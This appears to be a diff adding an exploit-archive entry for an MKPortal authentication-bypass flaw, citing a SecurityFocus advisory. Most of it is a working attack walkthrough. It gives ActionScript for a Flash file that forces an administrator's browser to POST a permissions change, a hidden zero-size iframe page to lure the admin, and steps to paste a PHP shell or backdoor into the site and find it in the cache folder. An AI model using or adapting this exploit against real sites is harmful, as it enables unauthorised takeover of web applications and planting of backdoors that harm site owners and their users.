@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/25515/info
+
+MKPortal is prone to an authentication-bypass vulnerability because it fails to restrict access to certain administrative functions.
+
+Attackers can exploit this issue to gain unauthorized access to the application.
+
+Versions prior to MKPortal 1.1.1 are vulnerable. 
+
+Start Macromedia Flash and create an swf file with this code:
+
+var idg:Number = 9;
+var p13:Number = 1;
+var Salva:String = "Save+Permissions";
+getURL("http://victim.com/mkportal/admin.php?ind=ad_perms&op=save_main", 
+"_self", "POST");
+
+Translate "Save+Permissions" in MKPortal language.
+Example: "Salva+questi+permessi" for italian sites.
+
+Then upload the swf file to a webserver and create an html page like 
+this:
+
+<html>
+<head>
+<title>Put a title here</title>
+</head>
+<body>
+<p>Put some text here<p>
+<iframe src="http://yoursite.com/exploit.swf" frameborder="0" height="0" 
+width="0"></iframe>
+</body>
+</html>
+
+Now send the html page to MKPortal administrator.
+When admin opens the page all guests will be able to administrate 
+MKPortal.
+
+So you can go here: 
+http://victim.com/mkportal/admin.php?ind=ad_contents&op=contents_new_php
+and paste a php shell or a backdoor.
+You can find your shell here: 
+http://victim.com/mkportal/cache/ppage_*.php
+where * is the ID of the page.
+
+Translate "page" in MKPortal language.
+Example: "pagina" for italian sites.
